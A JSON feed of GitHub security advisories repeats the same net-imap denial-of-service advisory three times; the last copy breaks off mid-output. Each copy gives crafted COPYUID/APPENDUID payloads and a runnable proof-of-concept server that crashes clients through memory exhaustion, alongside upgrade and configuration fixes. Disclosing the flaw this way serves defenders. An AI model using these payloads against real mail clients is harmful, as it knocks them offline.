{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Ruby gems hosted at RubyGems.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arubygems",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/rubygems.json",
    "description": "Security Advisory for Ruby gems hosted at RubyGems.org on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>There is a possibility for denial of service by memory exhaustion in <code>net-imap</code>'s response parser.  At any time while the client is connected, a malicious server can send  can send highly compressed <code>uid-set</code> data which is automatically read by the client's receiver thread.  The response parser uses <code>Range#to_a</code> to convert the <code>uid-set</code> data into arrays of integers, with no limitation on the expanded size of the ranges.</p>\n<h3 id=\"details\">Details</h3>\n<p>IMAP's <code>uid-set</code> and <code>sequence-set</code> formats can compress ranges of numbers, for example: <code>\"1,2,3,4,5\"</code> and <code>\"1:5\"</code> both represent the same set.  When <code>Net::IMAP::ResponseParser</code> receives <code>APPENDUID</code> or <code>COPYUID</code> response codes, it expands each <code>uid-set</code> into an array of integers.  On a 64 bit system, these arrays will expand to 8 bytes for each number in the set.  A malicious IMAP server may send specially crafted <code>APPENDUID</code> or <code>COPYUID</code> responses with very large <code>uid-set</code> ranges.</p>\n<p>The <code>Net::IMAP</code> client parses each server response in a separate thread, as soon as each responses is received from the server.  This attack works even when the client does not handle the <code>APPENDUID</code> or <code>COPYUID</code> responses.</p>\n<p>Malicious inputs:</p>\n<pre><code class=\"language-ruby\"># 40 bytes expands to ~1.6GB:\n\"* OK [COPYUID 1 1:99999999 1:99999999]\\r\\n\"\n\n# Worst *valid* input scenario (using uint32 max),\n# 44 bytes expands to 64GiB:\n\"* OK [COPYUID 1 1:4294967295 1:4294967295]\\r\\n\"\n\n# Numbers must be non-zero uint32, but this isn't validated.  Arrays larger than\n# UINT32_MAX can be created.  For example, the following would theoretically\n# expand to almost 800 exabytes:\n\"* OK [COPYUID 1 1:99999999999999999999 1:99999999999999999999]\\r\\n\"\n</code></pre>\n<p>Simple way to test this:</p>\n<pre><code class=\"language-ruby\">require \"net/imap\"\n\ndef test(size)\n  input = \"A004 OK [COPYUID 1 1:#{size} 1:#{size}] too large?\\n\"\n  parser = Net::IMAP::ResponseParser.new\n  parser.parse input\nend\n\ntest(99_999_999)\n</code></pre>\n<h3 id=\"fixes\">Fixes</h3>\n<h4 id=\"preferred-fix-minor-api-changes\">Preferred Fix, minor API changes</h4>\n<p>Upgrade to v0.4.19, v0.5.6, or higher, and configure:</p>\n<pre><code class=\"language-ruby\"># globally\nNet::IMAP.config.parser_use_deprecated_uidplus_data = false\n# per-client\nimap = Net::IMAP.new(hostname, ssl: true,\n                               parser_use_deprecated_uidplus_data: false)\nimap.config.parser_use_deprecated_uidplus_data = false\n</code></pre>\n<p>This replaces <code>UIDPlusData</code> with <code>AppendUIDData</code> and <code>CopyUIDData</code>.  These classes store their UIDs as <code>Net::IMAP::SequenceSet</code> objects (<em>not</em> expanded into arrays of integers).  Code that does not handle <code>APPENDUID</code> or <code>COPYUID</code> responses will not notice any difference.  Code that does handle these responses <em>may</em> need to be updated.  See the documentation for <a href=\"https://ruby.github.io/net-imap/Net/IMAP/UIDPlusData.html\">UIDPlusData</a>, <a href=\"https://ruby.github.io/net-imap/Net/IMAP/AppendUIDData.html\">AppendUIDData</a> and <a href=\"https://ruby.github.io/net-imap/Net/IMAP/CopyUIDData.html\">CopyUIDData</a>.</p>\n<p>For v0.3.8, this option is not available.\nFor v0.4.19, the default value is <code>true</code>.\nFor v0.5.6, the default value is <code>:up_to_max_size</code>.\nFor v0.6.0, the only allowed value will be <code>false</code>  <em>(<code>UIDPlusData</code> will be removed from v0.6)</em>.</p>\n<h4 id=\"mitigation-backward-compatible-api\">Mitigation, backward compatible API</h4>\n<p>Upgrade to v0.3.8, v0.4.19, v0.5.6, or higher.</p>\n<p>For backward compatibility, <code>uid-set</code> can still be expanded into an array, but a maximum limit will be applied.</p>\n<p>Assign <code>config.parser_max_deprecated_uidplus_data_size</code> to set the maximum <code>UIDPlusData</code> UID set size.\nWhen <code>config.parser_use_deprecated_uidplus_data == true</code>, larger sets will crash.\nWhen  <code>config.parser_use_deprecated_uidplus_data == :up_to_max_size</code>, larger sets will use <code>AppendUIDData</code> or <code>CopyUIDData</code>.</p>\n<p>For v0.3,8, this limit is <em>hard-coded</em> to 10,000, and larger sets will always raise <code>Net::IMAP::ResponseParseError</code>.\nFor v0.4.19, the limit defaults to 1000.\nFor v0.5.6, the limit defaults to 100.\nFor v0.6.0, the limit will be ignored  <em>(<code>UIDPlusData</code> will be removed from v0.6)</em>.</p>\n<h4 id=\"please-note-unhandled-responses\">Please Note: unhandled responses</h4>\n<p>If the client does not add response handlers to prune unhandled responses, a malicious server can still eventually exhaust all client memory, by repeatedly sending malicious responses.  However, <code>net-imap</code> has always retained unhandled responses, and it has always been necessary for long-lived connections to prune these responses.  <em>This is not significantly different from connecting to a trusted server with a long-lived connection.</em>  To limit the maximum number of retained responses, a simple handler might look something like the following:</p>\n<pre><code class=\"language-ruby\">limit = 1000\nimap.add_response_handler do |resp|\n  next unless resp.respond_to?(:name) &amp;&amp; resp.respond_to?(:data)\n  name = resp.name\n  code = resp.data.code&amp;.name if resp.data.respond_to?(:code)\n  if Net::IMAP::VERSION &gt; \"0.4.0\"\n    imap.responses(name) { _1.slice!(0...-limit) }\n    imap.responses(code) { _1.slice!(0...-limit) }\n  else\n    imap.responses(name).slice!(0...-limit)\n    imap.responses(code).slice!(0...-limit)\n  end\nend\n</code></pre>\n<h3 id=\"proof-of-concept\">Proof of concept</h3>\n<p>Save the following to a ruby file (e.g: <code>poc.rb</code>) and make it executable:</p>\n<pre><code class=\"language-ruby\">#!/usr/bin/env ruby\nrequire 'socket'\nrequire 'net/imap'\n\nif !defined?(Net::IMAP.config)\n  puts \"Net::IMAP.config is not available\"\nelsif !Net::IMAP.config.respond_to?(:parser_use_deprecated_uidplus_data)\n  puts \"Net::IMAP.config.parser_use_deprecated_uidplus_data is not available\"\nelse\n  Net::IMAP.config.parser_use_deprecated_uidplus_data = :up_to_max_size\n  puts \"Updated parser_use_deprecated_uidplus_data to :up_to_max_size\"\nend\n\nsize = Integer(ENV[\"UID_SET_SIZE\"] || 2**32-1)\n\ndef server_addr\n  Addrinfo.tcp(\"localhost\", 0).ip_address\nend\n\ndef create_tcp_server\n  TCPServer.new(server_addr, 0)\nend\n\ndef start_server\n  th = Thread.new do\n    yield\n  end\n  sleep 0.1 until th.stop?\nend\n\ndef copyuid_response(tag: \"*\", size: 2**32-1, text: \"too large?\")\n  \"#{tag} OK [COPYUID 1 1:#{size} 1:#{size}] #{text}\\r\\n\"\nend\n\ndef appenduid_response(tag: \"*\", size: 2**32-1, text: \"too large?\")\n  \"#{tag} OK [APPENDUID 1 1:#{size}] #{text}\\r\\n\"\nend\n\nserver = create_tcp_server\nport = server.addr[1]\nputs \"Server started on port #{port}\"\n\n# server\nstart_server do\n  sock = server.accept\n  begin\n    sock.print \"* OK test server\\r\\n\"\n    cmd = sock.gets(\"\\r\\n\", chomp: true)\n    tag = cmd.match(/\\A(\\w+) /)[1]\n    puts \"Received: #{cmd}\"\n\n    malicious_response = appenduid_response(size:)\n    puts \"Sending: #{malicious_response.chomp}\"\n    sock.print malicious_response\n\n    malicious_response = copyuid_response(size:)\n    puts \"Sending: #{malicious_response.chomp}\"\n    sock.print malicious_response\n    sock.print \"* CAPABILITY JUMBO=UIDPLUS PROOF_OF_CONCEPT\\r\\n\"\n    sock.print \"#{tag} OK CAPABILITY completed\\r\\n\"\n\n    cmd = sock.gets(\"\\r\\n\", chomp: true)\n    tag = cmd.match(/\\A(\\w+) /)[1]\n    puts \"Received: #{cmd}\"\n    sock.print \"* BYE If you made it this far, you passed the test!\\r\\n\"\n    sock.print \"#{tag} OK LOGOUT completed\\r\\n\"\n  rescue Exception =&gt; ex\n    puts \"Error in server: #{ex.message} (#{ex.class})\"\n  ensure\n    sock.close\n    server.close\n  end\nend\n\n# client\nbegin\n  puts \"Client connecting,..\"\n  imap = Net::IMAP.new(server_addr, port: port)\n  puts \"Received capabilities: #{imap.capability}\"\n  pp responses: imap.responses\n  imap.logout\nrescue Exception =&gt; ex\n  puts \"Error in client: #{ex.message} (#{ex.class})\"\n  puts ex.full_message\nensure\n  imap.disconnect if imap\nend\n</code></pre>\n<p>Use <code>ulimit</code> to limit the process's virtual memory.  The following example limits virtual memory to 1GB:</p>\n<pre><code class=\"language-console\">$ ( ulimit -v 1000000 &amp;&amp; exec ./poc.rb )\nServer started on port 34291\nClient connecting,..\nReceived: RUBY0001 CAPABILITY\nSending: * OK [APPENDUID 1 1:4294967295] too large?\nSending: * OK [COPYUID 1 1:4294967295 1:4294967295] too large?\nError in server: Connection reset by peer @ io_fillbuf - fd:9  (Errno::ECONNRESET)\nError in client: failed to allocate memory (NoMemoryError)\n/gems/net-imap-0.5.5/lib/net/imap.rb:3271:in 'Net::IMAP#get_tagged_response': failed to allocate memory (NoMemoryError)\n        from /gems/net-imap-0.5.5/lib/net/imap.rb:3371:in 'block in Net::IMAP#send_command'\n        from /rubylibdir/monitor.rb:201:in 'Monitor#synchronize'\n        from /rubylibdir/monitor.rb:201:in 'MonitorMixin#mon_synchronize'\n        from /gems/net-imap-0.5.5/lib/net/imap.rb:3353:in 'Net::IMAP#send_command'\n        from /gems/net-imap-0.5.5/lib/net/imap.rb:1128:in 'block in Net::IMAP#capability'\n        from /rubylibdir/monitor.rb:201:in 'Monitor#synchronize'\n        from /rubylibdir/monitor.rb:201:in 'MonitorMixin#mon_synchronize'\n        from /gems/net-imap-0.5.5/lib/net/imap.rb:1127:in 'Net::IMAP#capability'\n        from /workspace/poc.rb:70:in '&lt;main&gt;'\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ruby/net-imap/security/advisories/GHSA-7fc5-f82f-cx69\">https://github.com/ruby/net-imap/security/advisories/GHSA-7fc5-f82f-cx69</a></li>\n<li><a href=\"https://github.com/ruby/net-imap/commit/70e3ddd071a94e450b3238570af482c296380b35\">https://github.com/ruby/net-imap/commit/70e3ddd071a94e450b3238570af482c296380b35</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7fc5-f82f-cx69\">https://github.com/advisories/GHSA-7fc5-f82f-cx69</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7fc5-f82f-cx69",
            "title": "[net-imap] Possible DoS by memory exhaustion in net-imap",
            "date_modified": "2025-02-10T17:42:44.000Z",
            "date_published": "2025-02-10T17:42:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7fc5-f82f-cx69"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>There is a possibility for denial of service by memory exhaustion in <code>net-imap</code>'s response parser.  At any time while the client is connected, a malicious server can send  can send highly compressed <code>uid-set</code> data which is automatically read by the client's receiver thread.  The response parser uses <code>Range#to_a</code> to convert the <code>uid-set</code> data into arrays of integers, with no limitation on the expanded size of the ranges.</p>\n<h3 id=\"details\">Details</h3>\n<p>IMAP's <code>uid-set</code> and <code>sequence-set</code> formats can compress ranges of numbers, for example: <code>\"1,2,3,4,5\"</code> and <code>\"1:5\"</code> both represent the same set.  When <code>Net::IMAP::ResponseParser</code> receives <code>APPENDUID</code> or <code>COPYUID</code> response codes, it expands each <code>uid-set</code> into an array of integers.  On a 64 bit system, these arrays will expand to 8 bytes for each number in the set.  A malicious IMAP server may send specially crafted <code>APPENDUID</code> or <code>COPYUID</code> responses with very large <code>uid-set</code> ranges.</p>\n<p>The <code>Net::IMAP</code> client parses each server response in a separate thread, as soon as each responses is received from the server.  This attack works even when the client does not handle the <code>APPENDUID</code> or <code>COPYUID</code> responses.</p>\n<p>Malicious inputs:</p>\n<pre><code class=\"language-ruby\"># 40 bytes expands to ~1.6GB:\n\"* OK [COPYUID 1 1:99999999 1:99999999]\\r\\n\"\n\n# Worst *valid* input scenario (using uint32 max),\n# 44 bytes expands to 64GiB:\n\"* OK [COPYUID 1 1:4294967295 1:4294967295]\\r\\n\"\n\n# Numbers must be non-zero uint32, but this isn't validated.  Arrays larger than\n# UINT32_MAX can be created.  For example, the following would theoretically\n# expand to almost 800 exabytes:\n\"* OK [COPYUID 1 1:99999999999999999999 1:99999999999999999999]\\r\\n\"\n</code></pre>\n<p>Simple way to test this:</p>\n<pre><code class=\"language-ruby\">require \"net/imap\"\n\ndef test(size)\n  input = \"A004 OK [COPYUID 1 1:#{size} 1:#{size}] too large?\\n\"\n  parser = Net::IMAP::ResponseParser.new\n  parser.parse input\nend\n\ntest(99_999_999)\n</code></pre>\n<h3 id=\"fixes\">Fixes</h3>\n<h4 id=\"preferred-fix-minor-api-changes\">Preferred Fix, minor API changes</h4>\n<p>Upgrade to v0.4.19, v0.5.6, or higher, and configure:</p>\n<pre><code class=\"language-ruby\"># globally\nNet::IMAP.config.parser_use_deprecated_uidplus_data = false\n# per-client\nimap = Net::IMAP.new(hostname, ssl: true,\n                               parser_use_deprecated_uidplus_data: false)\nimap.config.parser_use_deprecated_uidplus_data = false\n</code></pre>\n<p>This replaces <code>UIDPlusData</code> with <code>AppendUIDData</code> and <code>CopyUIDData</code>.  These classes store their UIDs as <code>Net::IMAP::SequenceSet</code> objects (<em>not</em> expanded into arrays of integers).  Code that does not handle <code>APPENDUID</code> or <code>COPYUID</code> responses will not notice any difference.  Code that does handle these responses <em>may</em> need to be updated.  See the documentation for <a href=\"https://ruby.github.io/net-imap/Net/IMAP/UIDPlusData.html\">UIDPlusData</a>, <a href=\"https://ruby.github.io/net-imap/Net/IMAP/AppendUIDData.html\">AppendUIDData</a> and <a href=\"https://ruby.github.io/net-imap/Net/IMAP/CopyUIDData.html\">CopyUIDData</a>.</p>\n<p>For v0.3.8, this option is not available.\nFor v0.4.19, the default value is <code>true</code>.\nFor v0.5.6, the default value is <code>:up_to_max_size</code>.\nFor v0.6.0, the only allowed value will be <code>false</code>  <em>(<code>UIDPlusData</code> will be removed from v0.6)</em>.</p>\n<h4 id=\"mitigation-backward-compatible-api\">Mitigation, backward compatible API</h4>\n<p>Upgrade to v0.3.8, v0.4.19, v0.5.6, or higher.</p>\n<p>For backward compatibility, <code>uid-set</code> can still be expanded into an array, but a maximum limit will be applied.</p>\n<p>Assign <code>config.parser_max_deprecated_uidplus_data_size</code> to set the maximum <code>UIDPlusData</code> UID set size.\nWhen <code>config.parser_use_deprecated_uidplus_data == true</code>, larger sets will crash.\nWhen  <code>config.parser_use_deprecated_uidplus_data == :up_to_max_size</code>, larger sets will use <code>AppendUIDData</code> or <code>CopyUIDData</code>.</p>\n<p>For v0.3,8, this limit is <em>hard-coded</em> to 10,000, and larger sets will always raise <code>Net::IMAP::ResponseParseError</code>.\nFor v0.4.19, the limit defaults to 1000.\nFor v0.5.6, the limit defaults to 100.\nFor v0.6.0, the limit will be ignored  <em>(<code>UIDPlusData</code> will be removed from v0.6)</em>.</p>\n<h4 id=\"please-note-unhandled-responses\">Please Note: unhandled responses</h4>\n<p>If the client does not add response handlers to prune unhandled responses, a malicious server can still eventually exhaust all client memory, by repeatedly sending malicious responses.  However, <code>net-imap</code> has always retained unhandled responses, and it has always been necessary for long-lived connections to prune these responses.  <em>This is not significantly different from connecting to a trusted server with a long-lived connection.</em>  To limit the maximum number of retained responses, a simple handler might look something like the following:</p>\n<pre><code class=\"language-ruby\">limit = 1000\nimap.add_response_handler do |resp|\n  next unless resp.respond_to?(:name) &amp;&amp; resp.respond_to?(:data)\n  name = resp.name\n  code = resp.data.code&amp;.name if resp.data.respond_to?(:code)\n  if Net::IMAP::VERSION &gt; \"0.4.0\"\n    imap.responses(name) { _1.slice!(0...-limit) }\n    imap.responses(code) { _1.slice!(0...-limit) }\n  else\n    imap.responses(name).slice!(0...-limit)\n    imap.responses(code).slice!(0...-limit)\n  end\nend\n</code></pre>\n<h3 id=\"proof-of-concept\">Proof of concept</h3>\n<p>Save the following to a ruby file (e.g: <code>poc.rb</code>) and make it executable:</p>\n<pre><code class=\"language-ruby\">#!/usr/bin/env ruby\nrequire 'socket'\nrequire 'net/imap'\n\nif !defined?(Net::IMAP.config)\n  puts \"Net::IMAP.config is not available\"\nelsif !Net::IMAP.config.respond_to?(:parser_use_deprecated_uidplus_data)\n  puts \"Net::IMAP.config.parser_use_deprecated_uidplus_data is not available\"\nelse\n  Net::IMAP.config.parser_use_deprecated_uidplus_data = :up_to_max_size\n  puts \"Updated parser_use_deprecated_uidplus_data to :up_to_max_size\"\nend\n\nsize = Integer(ENV[\"UID_SET_SIZE\"] || 2**32-1)\n\ndef server_addr\n  Addrinfo.tcp(\"localhost\", 0).ip_address\nend\n\ndef create_tcp_server\n  TCPServer.new(server_addr, 0)\nend\n\ndef start_server\n  th = Thread.new do\n    yield\n  end\n  sleep 0.1 until th.stop?\nend\n\ndef copyuid_response(tag: \"*\", size: 2**32-1, text: \"too large?\")\n  \"#{tag} OK [COPYUID 1 1:#{size} 1:#{size}] #{text}\\r\\n\"\nend\n\ndef appenduid_response(tag: \"*\", size: 2**32-1, text: \"too large?\")\n  \"#{tag} OK [APPENDUID 1 1:#{size}] #{text}\\r\\n\"\nend\n\nserver = create_tcp_server\nport = server.addr[1]\nputs \"Server started on port #{port}\"\n\n# server\nstart_server do\n  sock = server.accept\n  begin\n    sock.print \"* OK test server\\r\\n\"\n    cmd = sock.gets(\"\\r\\n\", chomp: true)\n    tag = cmd.match(/\\A(\\w+) /)[1]\n    puts \"Received: #{cmd}\"\n\n    malicious_response = appenduid_response(size:)\n    puts \"Sending: #{malicious_response.chomp}\"\n    sock.print malicious_response\n\n    malicious_response = copyuid_response(size:)\n    puts \"Sending: #{malicious_response.chomp}\"\n    sock.print malicious_response\n    sock.print \"* CAPABILITY JUMBO=UIDPLUS PROOF_OF_CONCEPT\\r\\n\"\n    sock.print \"#{tag} OK CAPABILITY completed\\r\\n\"\n\n    cmd = sock.gets(\"\\r\\n\", chomp: true)\n    tag = cmd.match(/\\A(\\w+) /)[1]\n    puts \"Received: #{cmd}\"\n    sock.print \"* BYE If you made it this far, you passed the test!\\r\\n\"\n    sock.print \"#{tag} OK LOGOUT completed\\r\\n\"\n  rescue Exception =&gt; ex\n    puts \"Error in server: #{ex.message} (#{ex.class})\"\n  ensure\n    sock.close\n    server.close\n  end\nend\n\n# client\nbegin\n  puts \"Client connecting,..\"\n  imap = Net::IMAP.new(server_addr, port: port)\n  puts \"Received capabilities: #{imap.capability}\"\n  pp responses: imap.responses\n  imap.logout\nrescue Exception =&gt; ex\n  puts \"Error in client: #{ex.message} (#{ex.class})\"\n  puts ex.full_message\nensure\n  imap.disconnect if imap\nend\n</code></pre>\n<p>Use <code>ulimit</code> to limit the process's virtual memory.  The following example limits virtual memory to 1GB:</p>\n<pre><code class=\"language-console\">$ ( ulimit -v 1000000 &amp;&amp; exec ./poc.rb )\nServer started on port 34291\nClient connecting,..\nReceived: RUBY0001 CAPABILITY\nSending: * OK [APPENDUID 1 1:4294967295] too large?\nSending: * OK [COPYUID 1 1:4294967295 1:4294967295] too large?\nError in server: Connection reset by peer @ io_fillbuf - fd:9  (Errno::ECONNRESET)\nError in client: failed to allocate memory (NoMemoryError)\n/gems/net-imap-0.5.5/lib/net/imap.rb:3271:in 'Net::IMAP#get_tagged_response': failed to allocate memory (NoMemoryError)\n        from /gems/net-imap-0.5.5/lib/net/imap.rb:3371:in 'block in Net::IMAP#send_command'\n        from /rubylibdir/monitor.rb:201:in 'Monitor#synchronize'\n        from /rubylibdir/monitor.rb:201:in 'MonitorMixin#mon_synchronize'\n        from /gems/net-imap-0.5.5/lib/net/imap.rb:3353:in 'Net::IMAP#send_command'\n        from /gems/net-imap-0.5.5/lib/net/imap.rb:1128:in 'block in Net::IMAP#capability'\n        from /rubylibdir/monitor.rb:201:in 'Monitor#synchronize'\n        from /rubylibdir/monitor.rb:201:in 'MonitorMixin#mon_synchronize'\n        from /gems/net-imap-0.5.5/lib/net/imap.rb:1127:in 'Net::IMAP#capability'\n        from /workspace/poc.rb:70:in '&lt;main&gt;'\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ruby/net-imap/security/advisories/GHSA-7fc5-f82f-cx69\">https://github.com/ruby/net-imap/security/advisories/GHSA-7fc5-f82f-cx69</a></li>\n<li><a href=\"https://github.com/ruby/net-imap/commit/70e3ddd071a94e450b3238570af482c296380b35\">https://github.com/ruby/net-imap/commit/70e3ddd071a94e450b3238570af482c296380b35</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7fc5-f82f-cx69\">https://github.com/advisories/GHSA-7fc5-f82f-cx69</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7fc5-f82f-cx69",
            "title": "[net-imap] Possible DoS by memory exhaustion in net-imap",
            "date_modified": "2025-02-10T17:42:44.000Z",
            "date_published": "2025-02-10T17:42:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7fc5-f82f-cx69"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>There is a possibility for denial of service by memory exhaustion in <code>net-imap</code>'s response parser.  At any time while the client is connected, a malicious server can send  can send highly compressed <code>uid-set</code> data which is automatically read by the client's receiver thread.  The response parser uses <code>Range#to_a</code> to convert the <code>uid-set</code> data into arrays of integers, with no limitation on the expanded size of the ranges.</p>\n<h3 id=\"details\">Details</h3>\n<p>IMAP's <code>uid-set</code> and <code>sequence-set</code> formats can compress ranges of numbers, for example: <code>\"1,2,3,4,5\"</code> and <code>\"1:5\"</code> both represent the same set.  When <code>Net::IMAP::ResponseParser</code> receives <code>APPENDUID</code> or <code>COPYUID</code> response codes, it expands each <code>uid-set</code> into an array of integers.  On a 64 bit system, these arrays will expand to 8 bytes for each number in the set.  A malicious IMAP server may send specially crafted <code>APPENDUID</code> or <code>COPYUID</code> responses with very large <code>uid-set</code> ranges.</p>\n<p>The <code>Net::IMAP</code> client parses each server response in a separate thread, as soon as each responses is received from the server.  This attack works even when the client does not handle the <code>APPENDUID</code> or <code>COPYUID</code> responses.</p>\n<p>Malicious inputs:</p>\n<pre><code class=\"language-ruby\"># 40 bytes expands to ~1.6GB:\n\"* OK [COPYUID 1 1:99999999 1:99999999]\\r\\n\"\n\n# Worst *valid* input scenario (using uint32 max),\n# 44 bytes expands to 64GiB:\n\"* OK [COPYUID 1 1:4294967295 1:4294967295]\\r\\n\"\n\n# Numbers must be non-zero uint32, but this isn't validated.  Arrays larger than\n# UINT32_MAX can be created.  For example, the following would theoretically\n# expand to almost 800 exabytes:\n\"* OK [COPYUID 1 1:99999999999999999999 1:99999999999999999999]\\r\\n\"\n</code></pre>\n<p>Simple way to test this:</p>\n<pre><code class=\"language-ruby\">require \"net/imap\"\n\ndef test(size)\n  input = \"A004 OK [COPYUID 1 1:#{size} 1:#{size}] too large?\\n\"\n  parser = Net::IMAP::ResponseParser.new\n  parser.parse input\nend\n\ntest(99_999_999)\n</code></pre>\n<h3 id=\"fixes\">Fixes</h3>\n<h4 id=\"preferred-fix-minor-api-changes\">Preferred Fix, minor API changes</h4>\n<p>Upgrade to v0.4.19, v0.5.6, or higher, and configure:</p>\n<pre><code class=\"language-ruby\"># globally\nNet::IMAP.config.parser_use_deprecated_uidplus_data = false\n# per-client\nimap = Net::IMAP.new(hostname, ssl: true,\n                               parser_use_deprecated_uidplus_data: false)\nimap.config.parser_use_deprecated_uidplus_data = false\n</code></pre>\n<p>This replaces <code>UIDPlusData</code> with <code>AppendUIDData</code> and <code>CopyUIDData</code>.  These classes store their UIDs as <code>Net::IMAP::SequenceSet</code> objects (<em>not</em> expanded into arrays of integers).  Code that does not handle <code>APPENDUID</code> or <code>COPYUID</code> responses will not notice any difference.  Code that does handle these responses <em>may</em> need to be updated.  See the documentation for <a href=\"https://ruby.github.io/net-imap/Net/IMAP/UIDPlusData.html\">UIDPlusData</a>, <a href=\"https://ruby.github.io/net-imap/Net/IMAP/AppendUIDData.html\">AppendUIDData</a> and <a href=\"https://ruby.github.io/net-imap/Net/IMAP/CopyUIDData.html\">CopyUIDData</a>.</p>\n<p>For v0.3.8, this option is not available.\nFor v0.4.19, the default value is <code>true</code>.\nFor v0.5.6, the default value is <code>:up_to_max_size</code>.\nFor v0.6.0, the only allowed value will be <code>false</code>  <em>(<code>UIDPlusData</code> will be removed from v0.6)</em>.</p>\n<h4 id=\"mitigation-backward-compatible-api\">Mitigation, backward compatible API</h4>\n<p>Upgrade to v0.3.8, v0.4.19, v0.5.6, or higher.</p>\n<p>For backward compatibility, <code>uid-set</code> can still be expanded into an array, but a maximum limit will be applied.</p>\n<p>Assign <code>config.parser_max_deprecated_uidplus_data_size</code> to set the maximum <code>UIDPlusData</code> UID set size.\nWhen <code>config.parser_use_deprecated_uidplus_data == true</code>, larger sets will crash.\nWhen  <code>config.parser_use_deprecated_uidplus_data == :up_to_max_size</code>, larger sets will use <code>AppendUIDData</code> or <code>CopyUIDData</code>.</p>\n<p>For v0.3,8, this limit is <em>hard-coded</em> to 10,000, and larger sets will always raise <code>Net::IMAP::ResponseParseError</code>.\nFor v0.4.19, the limit defaults to 1000.\nFor v0.5.6, the limit defaults to 100.\nFor v0.6.0, the limit will be ignored  <em>(<code>UIDPlusData</code> will be removed from v0.6)</em>.</p>\n<h4 id=\"please-note-unhandled-responses\">Please Note: unhandled responses</h4>\n<p>If the client does not add response handlers to prune unhandled responses, a malicious server can still eventually exhaust all client memory, by repeatedly sending malicious responses.  However, <code>net-imap</code> has always retained unhandled responses, and it has always been necessary for long-lived connections to prune these responses.  <em>This is not significantly different from connecting to a trusted server with a long-lived connection.</em>  To limit the maximum number of retained responses, a simple handler might look something like the following:</p>\n<pre><code class=\"language-ruby\">limit = 1000\nimap.add_response_handler do |resp|\n  next unless resp.respond_to?(:name) &amp;&amp; resp.respond_to?(:data)\n  name = resp.name\n  code = resp.data.code&amp;.name if resp.data.respond_to?(:code)\n  if Net::IMAP::VERSION &gt; \"0.4.0\"\n    imap.responses(name) { _1.slice!(0...-limit) }\n    imap.responses(code) { _1.slice!(0...-limit) }\n  else\n    imap.responses(name).slice!(0...-limit)\n    imap.responses(code).slice!(0...-limit)\n  end\nend\n</code></pre>\n<h3 id=\"proof-of-concept\">Proof of concept</h3>\n<p>Save the following to a ruby file (e.g: <code>poc.rb</code>) and make it executable:</p>\n<pre><code class=\"language-ruby\">#!/usr/bin/env ruby\nrequire 'socket'\nrequire 'net/imap'\n\nif !defined?(Net::IMAP.config)\n  puts \"Net::IMAP.config is not available\"\nelsif !Net::IMAP.config.respond_to?(:parser_use_deprecated_uidplus_data)\n  puts \"Net::IMAP.config.parser_use_deprecated_uidplus_data is not available\"\nelse\n  Net::IMAP.config.parser_use_deprecated_uidplus_data = :up_to_max_size\n  puts \"Updated parser_use_deprecated_uidplus_data to :up_to_max_size\"\nend\n\nsize = Integer(ENV[\"UID_SET_SIZE\"] || 2**32-1)\n\ndef server_addr\n  Addrinfo.tcp(\"localhost\", 0).ip_address\nend\n\ndef create_tcp_server\n  TCPServer.new(server_addr, 0)\nend\n\ndef start_server\n  th = Thread.new do\n    yield\n  end\n  sleep 0.1 until th.stop?\nend\n\ndef copyuid_response(tag: \"*\", size: 2**32-1, text: \"too large?\")\n  \"#{tag} OK [COPYUID 1 1:#{size} 1:#{size}] #{text}\\r\\n\"\nend\n\ndef appenduid_response(tag: \"*\", size: 2**32-1, text: \"too large?\")\n  \"#{tag} OK [APPENDUID 1 1:#{size}] #{text}\\r\\n\"\nend\n\nserver = create_tcp_server\nport = server.addr[1]\nputs \"Server started on port #{port}\"\n\n# server\nstart_server do\n  sock = server.accept\n  begin\n    sock.print \"* OK test server\\r\\n\"\n    cmd = sock.gets(\"\\r\\n\", chomp: true)\n    tag = cmd.match(/\\A(\\w+) /)[1]\n    puts \"Received: #{cmd}\"\n\n    malicious_response = appenduid_response(size:)\n    puts \"Sending: #{malicious_response.chomp}\"\n    sock.print malicious_response\n\n    malicious_response = copyuid_response(size:)\n    puts \"Sending: #{malicious_response.chomp}\"\n    sock.print malicious_response\n    sock.print \"* CAPABILITY JUMBO=UIDPLUS PROOF_OF_CONCEPT\\r\\n\"\n    sock.print \"#{tag} OK CAPABILITY completed\\r\\n\"\n\n    cmd = sock.gets(\"\\r\\n\", chomp: true)\n    tag = cmd.match(/\\A(\\w+) /)[1]\n    puts \"Received: #{cmd}\"\n    sock.print \"* BYE If you made it this far, you passed the test!\\r\\n\"\n    sock.print \"#{tag} OK LOGOUT completed\\r\\n\"\n  rescue Exception =&gt; ex\n    puts \"Error in server: #{ex.message} (#{ex.class})\"\n  ensure\n    sock.close\n    server.close\n  end\nend\n\n# client\nbegin\n  puts \"Client connecting,..\"\n  imap = Net::IMAP.new(server_addr, port: port)\n  puts \"Received capabilities: #{imap.capability}\"\n  pp responses: imap.responses\n  imap.logout\nrescue Exception =&gt; ex\n  puts \"Error in client: #{ex.message} (#{ex.class})\"\n  puts ex.full_message\nensure\n  imap.disconnect if imap\nend\n</code></pre>\n<p>Use <code>ulimit</code> to limit the process's virtual memory.  The following example limits virtual memory to 1GB:</p>\n<pre><code class=\"language-console\">$ ( ulimit -v 1000000 &amp;&amp; exec ./poc.rb )\nServer started on port 34291\nClient connecting,..\nReceived: RUBY0001 CAPABILITY\nSending: * OK [APPENDUID 1 1:4294967295] too large?\nSending: * OK [COPYUID 1 1:4294967295 1:4294967295] too large?\nError in server: Connection reset by peer @ io_fillbuf - fd:9  (Errno::ECONNRESET)\nError in client: failed to allocate memory 